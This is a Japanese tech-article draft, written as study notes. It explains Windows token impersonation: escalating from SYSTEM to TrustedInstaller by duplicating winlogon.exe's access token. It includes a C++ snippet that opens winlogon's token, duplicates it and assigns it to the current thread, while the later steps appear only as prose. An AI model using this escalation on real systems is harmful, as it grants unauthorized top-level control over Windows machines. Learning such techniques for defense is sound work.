---
title: "トークン偽装攻撃をコード付きで解説(Windows)"
emoji: "🦔"
type: "tech" # tech: 技術記事 / idea: アイデア
topics: ["セキュリティ", "windows", "cpp"]
published: false
---

この記事ではセキュリティの勉強で学んだトークン偽装攻撃について実際のコードと一緒に備忘録として残します。
Windowsにはプロセスのアクセス管理の仕組みとしてアクセストークンという手法を用いています。
各プロセスにはアクセス権限情報を持ったアクセストークンが割り当てられており、それは対応する権限があれば複製をすることができます。
トークン偽装攻撃は自プロセスよりも高い権限が付与されたアクセストークンを複製し、
自プロセスに割り当てることでWindowsの最高権限であるTrustedInstallerに昇格する攻撃です。

## 昇格までの流れ

1. SYSTEM権限で起動しているプロセスからアクセストークンを複製
1. 現在のプロセスに複製したアクセストークンを付与
1. SYSTEM権限でTrustedInstaller.exeを起動する。
1. 起動したTrustedInstaller.exeのアクセストークンを複製
1. 複製したアクセストークンを付与した新しいプロセスを起動する。
1. プロセスがTrustedInstaller権限で起動する。

## SYSTEM権限で起動しているプロセスからアクセストークンを複製

Windowsのログオン機能をつかさどるwinlogon.exeはSYSTEM権限で起動されています。
そのため、winlogon.exeにはSYSTEM権限のアクセストークンが紐づけられています。
以下関数を利用してwinlogon.exeのアクセストークンを偽装トークン(TokenImpersonation)としてコピーします。
そのあと複製した偽装トークンを現在のプロセスに割り当てます。

```cpp
 // winlogon.exeのプロセスのハンドルを取得。(pidはwinlogon.exeのプロセスID)
 HANDLE hProcessWinlogon = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, pid);
 // winlogon.exeのプロセスハンドルからアクセストークンのハンドルを取得
 HANDLE hTokenWinlogon;
 OpenProcessToken(hProcessWinlogon, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &hTokenWinlogon); 
 //DuplicateProcessToken関数を使用してして偽装トークンとして複製し、ハンドルを取得。
 HANDLE hImpersonationToken;
 DuplicateTokenEx(hTokenWinlogon, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TOKEN_TYPE::TokenImpersonation, &hImpersonationToken)
 // 現在のプロセスのハンドルを取得
 HANDLE hCurrentThread = GetCurrentThread();
 // 複製したアクセストークンを現在のスレッドに割り当てる。
 SetThreadToken(&hCurrentThread, hImpersonationToken);
```

## 現在のプロセスに複製したアクセストークンを付与

後述するTrustedInstallerサービスを起動するために、複製したSYSTEM権限を持つアクセストークンを自プロセスに付与することで自プロセスをSYSTEM権限に昇格させます。

## 起動したTrustedInstaller.exeのアクセストークンを複製

TrustedInstallerに昇格するにはTrustedInstaller権限のアクセストークンが付与されているプロセスが必要です。
WindowsのTrustedInstallerサービスはSYSTEM権限で起動することができ、そのプロセスのアクセストークンにはTrustedInstallerの権限が付与されています。
それを利用して起動したTrustedInstaller.exeからアクセストークンを複製します。

## プロセスがTrustedInstaller権限で起動する

あとは作成するプロセスにTrustedInstallerの権限を付与するだけです。

## 参考記事

<https://book.hacktricks.xyz/v/jp/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens>
<https://blog.nflabs.jp/entry/2021/12/20/094644>
